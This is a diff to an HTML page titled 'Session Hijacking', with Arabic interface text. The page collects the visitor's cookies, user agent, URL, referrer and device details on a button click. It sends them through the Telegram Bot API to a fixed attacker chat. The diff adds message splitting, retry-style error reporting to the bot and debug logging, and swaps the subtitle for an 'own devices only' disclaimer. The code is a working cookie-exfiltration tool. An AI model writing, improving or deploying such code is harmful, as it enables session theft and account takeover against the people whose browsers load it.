@@ -97,6 +97,10 @@
             color: #0f0;
             margin-top: 8px;
         }
+        .badge.error {
+            background: rgba(255,0,0,0.15);
+            color: #f66;
+        }
         .note {
             margin-top: 20px;
             font-size: 12px;
@@ -112,12 +116,22 @@
             border-radius: 12px;
             margin: 8px 0;
         }
+        .debug-box {
+            background: rgba(0,0,0,0.3);
+            padding: 10px;
+            border-radius: 12px;
+            font-size: 12px;
+            color: #8f8;
+            text-align: left;
+            margin: 8px 0;
+            display: none;
+        }
     </style>
 </head>
 <body>
 <div class="container">
     <h1>🔐 Session Hijacking</h1>
-    <p class="sub">تجربة تعليمية لجلب ملفات تعريف الارتباط وإرسالها لبوت تيليجرام</p>
+    <p class="sub">تجربة تعليمية – استخدم على أجهزتك الخاصة فقط</p>
 
     <div class="warning">⚠️ استخدم هذا فقط على أجهزتك الخاصة لأغراض تعليمية.</div>
 
@@ -132,6 +146,8 @@
         <strong>📱 معلومات إضافية:</strong><br>
         <span id="extraInfo">(سيتم جمعها عند النقر)</span>
     </div>
+
+    <div class="debug-box" id="debugBox"></div>
 
     <div class="badge" id="telegramStatus">📨 جاهز</div>
     <div class="note">⚡ سيتم إرسال البيانات إلى المعرف الثابت في تيليجرام</div>
@@ -152,12 +168,20 @@
     const cookieValueSpan = document.getElementById('cookieValue');
     const extraInfoSpan = document.getElementById('extraInfo');
     const telegramStatus = document.getElementById('telegramStatus');
+    const debugBox = document.getElementById('debugBox');
 
     // ================================
-    // الدوال الأساسية
+    // دالة كتابة رسائل التصحيح
     // ================================
+    function debug(msg) {
+        debugBox.style.display = 'block';
+        debugBox.innerHTML += `[${new Date().toLocaleTimeString()}] ${msg}\n`;
+        console.log(msg);
+    }
 
+    // ================================
     // جمع البيانات
+    // ================================
     function collectData() {
         const cookies = document.cookie || 'لا توجد كوكيز (قد تكون HttpOnly)';
         const userAgent = navigator.userAgent;
@@ -180,9 +204,11 @@
         };
     }
 
-    // عرض البيانات في الواجهة
+    // ================================
+    // عرض البيانات
+    // ================================
     function displayData(data) {
-        cookieValueSpan.textContent = data.cookies;
+        cookieValueSpan.textContent = data.cookies || '(فارغ)';
         extraInfoSpan.innerHTML = `
             🕒 الوقت: ${data.timestamp}<br>
             🌐 الرابط: ${data.url}<br>
@@ -194,49 +220,110 @@
         `;
     }
 
+    // ================================
+    // تقسيم الرسالة الطويلة (حد 4096 حرف)
+    // ================================
+    function splitMessage(text, maxLength = 4000) {
+        if (text.length <= maxLength) return [text];
+        const parts = [];
+        while (text.length > 0) {
+            let part = text.slice(0, maxLength);
+            // نحاول القطع عند سطر جديد لتجنب قطع النص في منتصف الكلمة
+            const lastNewline = part.lastIndexOf('\n');
+            if (lastNewline > maxLength * 0.8) {
+                part = text.slice(0, lastNewline);
+                text = text.slice(lastNewline + 1);
+            } else {
+                text = text.slice(maxLength);
+            }
+            parts.push(part);
+        }
+        return parts;
+    }
+
+    // ================================
     // إرسال البيانات إلى تيليجرام
+    // ================================
     async function sendToTelegram(data) {
         telegramStatus.textContent = '⏳ جاري الإرسال...';
         telegramStatus.style.color = '#ff0';
+        telegramStatus.className = 'badge';
 
-        // بناء رسالة منظمة
-        let message = `🔐 **تقرير Session Hijacking**\n\n`;
-        message += `🍪 **الكوكيز:**\n\`${data.cookies}\`\n\n`;
-        message += `📱 **المتصفح:** ${data.userAgent}\n`;
-        message += `🌐 **الرابط:** ${data.url}\n`;
-        message += `🔗 **المرجع:** ${data.referrer}\n`;
-        message += `🖥️ **الشاشة:** ${data.screen}\n`;
-        message += `🌍 **اللغة:** ${data.language}\n`;
-        message += `💻 **المنصة:** ${data.platform}\n`;
-        message += `🕒 **الوقت:** ${data.timestamp}\n`;
+        // بناء الرسالة الأساسية
+        let fullMessage = `🔐 **تقرير Session Hijacking**\n\n`;
+        fullMessage += `🍪 **الكوكيز:**\n\`${data.cookies || '(فارغ)'}\`\n\n`;
+        fullMessage += `📱 **المتصفح:** ${data.userAgent}\n`;
+        fullMessage += `🌐 **الرابط:** ${data.url}\n`;
+        fullMessage += `🔗 **المرجع:** ${data.referrer}\n`;
+        fullMessage += `🖥️ **الشاشة:** ${data.screen}\n`;
+        fullMessage += `🌍 **اللغة:** ${data.language}\n`;
+        fullMessage += `💻 **المنصة:** ${data.platform}\n`;
+        fullMessage += `🕒 **الوقت:** ${data.timestamp}\n`;
 
-        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-        const payload = {
-            chat_id: TARGET_CHAT_ID,
-            text: message,
-            parse_mode: 'Markdown'
-        };
+        // تقسيم الرسالة إذا كانت طويلة
+        const parts = splitMessage(fullMessage, 4000);
+        let success = true;
+        let errorMsg = '';
 
-        try {
-            const response = await fetch(url, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(payload)
-            });
-            const result = await response.json();
-            if (result.ok) {
-                telegramStatus.textContent = '✅ تم الإرسال بنجاح!';
-                telegramStatus.style.color = '#0f0';
-                statusDiv.innerHTML = '✅ اكتمل الإرسال إلى البوت.';
-            } else {
-                telegramStatus.textContent = '❌ فشل الإرسال: ' + (result.description || 'خطأ غير معروف');
-                telegramStatus.style.color = '#f00';
-                statusDiv.innerHTML = '❌ فشل الإرسال. تحقق من التوكن والمعرف.';
+        for (let i = 0; i < parts.length; i++) {
+            const part = parts[i];
+            const isLast = (i === parts.length - 1);
+            let text = part;
+            if (parts.length > 1) {
+                text = `(الجزء ${i+1}/${parts.length})\n\n` + part;
             }
-        } catch (e) {
-            telegramStatus.textContent = '❌ خطأ في الاتصال: ' + e.message;
-            telegramStatus.style.color = '#f00';
-            statusDiv.innerHTML = '❌ خطأ في الاتصال.';
+
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            const payload = {
+                chat_id: TARGET_CHAT_ID,
+                text: text,
+                parse_mode: 'Markdown'
+            };
+
+            try {
+                debug(`إرسال الجزء ${i+1}/${parts.length}...`);
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+                const result = await response.json();
+                if (result.ok) {
+                    debug(`✅ الجزء ${i+1} تم بنجاح`);
+                } else {
+                    success = false;
+                    errorMsg = result.description || 'خطأ غير معروف';
+                    debug(`❌ فشل الجزء ${i+1}: ${errorMsg}`);
+                    // نحاول إرسال الخطأ كرسالة منفصلة (بدون Markdown)
+                    if (isLast) {
+                        await fetch(url, {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({
+                                chat_id: TARGET_CHAT_ID,
+                                text: `❌ فشل إرسال التقرير: ${errorMsg}`
+                            })
+                        });
+                    }
+                    break;
+                }
+            } catch (e) {
+                success = false;
+                errorMsg = e.message;
+                debug(`❌ خطأ في الاتصال: ${e.message}`);
+                break;
+            }
+        }
+
+        if (success) {
+            telegramStatus.textContent = '✅ تم الإرسال بنجاح!';
+            telegramStatus.style.color = '#0f0';
+            statusDiv.innerHTML = '✅ اكتمل الإرسال إلى البوت.';
+        } else {
+            telegramStatus.textContent = '❌ فشل الإرسال: ' + errorMsg;
+            telegramStatus.style.color = '#f66';
+            telegramStatus.className = 'badge error';
+            statusDiv.innerHTML = '❌ فشل الإرسال. راجع التفاصيل في صندوق التصحيح.';
         }
     }
 
@@ -246,16 +333,20 @@
     captureBtn.addEventListener('click', async function() {
         captureBtn.disabled = true;
         statusDiv.innerHTML = '⏳ جاري جمع البيانات...';
+        debug('🔄 بدء العملية');
 
         // جمع البيانات
         const data = collectData();
         displayData(data);
+        debug('✅ تم جمع البيانات');
 
         statusDiv.innerHTML = '📨 جاري الإرسال إلى تيليجرام...';
+        debug('📨 بدء الإرسال...');
         await sendToTelegram(data);
 
         captureBtn.disabled = false;
         statusDiv.innerHTML = '✅ انتهت العملية. يمكنك تكرار التجربة.';
+        debug('✅ العملية كاملة');
     });
 
     // ================================
@@ -263,6 +354,7 @@
     // ================================
     statusDiv.innerHTML = '📌 اضغط على الزر لبدء العملية';
     telegramStatus.textContent = '📨 جاهز';
+    debug('🚀 الصفحة جاهزة');
 </script>
 </body>
 </html>
